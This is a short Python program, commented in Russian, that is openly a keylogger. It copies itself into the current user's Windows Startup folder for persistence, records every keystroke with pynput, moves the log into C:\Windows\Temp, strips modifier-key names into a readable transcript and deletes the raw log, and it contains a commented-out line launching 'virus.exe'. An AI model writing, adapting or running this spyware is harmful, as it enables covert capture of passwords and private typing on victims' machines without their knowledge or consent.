import pynput
from pynput.keyboard import Key, Listener
import re
import shutil
import os
import random
import getpass


#___________________________________________________________________________
def main():

  #ЗАЛЕЗ В АВТОЗАГРУЗКУ
  username = getpass.getuser()
  dir_name = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'
  shutil.copy('main.py', dir_name)
  print('<<< SUCCESSFUL >>>')

  # os.startfile('virus.exe')  

#___________________________________________________________________________

  # ЗАПИСЬ КЛАВИШ
  def on_press(key):
      with open("log.txt", "a") as f:
          f.write(str(key))

  with Listener(on_press=on_press) as listener:
      listener.join()
      
  print('<<< SUCCESSFUL >>>')

  transcrpt()
#___________________________________________________________________________
def transcrpt():


# #ВЫПОЛНЕНИТЬ СЛЕДУЮЩИЙ УЧАСТОК КОДА ПОСЛЕ ЗАВЕРШЕНИЯ РАБОТЫ КЕЙЛОГЕРА


#___________________________________________________________________________

#ПЕРЕМЕЩЕНИЕ ЛОГОВ В TEMP
  shutil.move("log.txt", "c:\\Windows\\Temp\\log.txt")

#___________________________________________________________________________

#ПЕРЕВОД LOG
  file = open('c:\\Windows\\Temp\\log.txt', encoding='utf-8')
  result = file.read()
  file.close()
  result = str(result.split())

  transcript = re.sub("'",'', result)
  transcript = re.sub('"','', transcript)
  transcript = re.sub("Key.cmd",'', transcript)
  transcript = re.sub("Key.tab",'', transcript)
  transcript = re.sub("Key.alt_l",'', transcript)
  transcript = re.sub("Key.alt_r",'', transcript)
  transcript = re.sub("Key.ctrl_l",'', transcript)
  transcript = re.sub("Key.ctrl_r",'', transcript)
  transcript = re.sub("/",'', transcript)
  transcript = re.sub("|",'', transcript)
  transcript = re.sub(",",'', transcript)
  transcript = re.sub("Key.right",'', transcript)
  transcript = re.sub("Key.space",'  ', transcript)
  transcript = re.sub("Key.backspace",'*', transcript)
  transcript = re.sub("Key.shift",'', transcript)

  with open('transcript_log.txt', 'a') as tr:
      tr.write(transcript)
  print('<<< SUCCESSFUL >>>')

#___________________________________________________________________________

#ПЕРЕМЕЩЕНИЕ ПЕРЕВЕДЁННЫХ ЛОГОВ В TEMP
  shutil.move("transcript_log.txt", "c:\\Windows\\Temp\\transcript_log.txt")

#___________________________________________________________________________

#УДАЛЕНИЕ НЕ ПЕРЕВЕДЁННЫХ ЛОГОВ
  os.remove('c:\\Windows\\Temp\\log.txt')
  print('<<< SUCCESSFUL >>>')


#ЗАЛЕЗ В АВТОЗАГРУЗКУ
  username = getpass.getuser()
  dir_name = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'
  shutil.copy('main.py', dir_name)
  print('<<< SUCCESSFUL >>>')


if __name__ == '__main__':
  main()
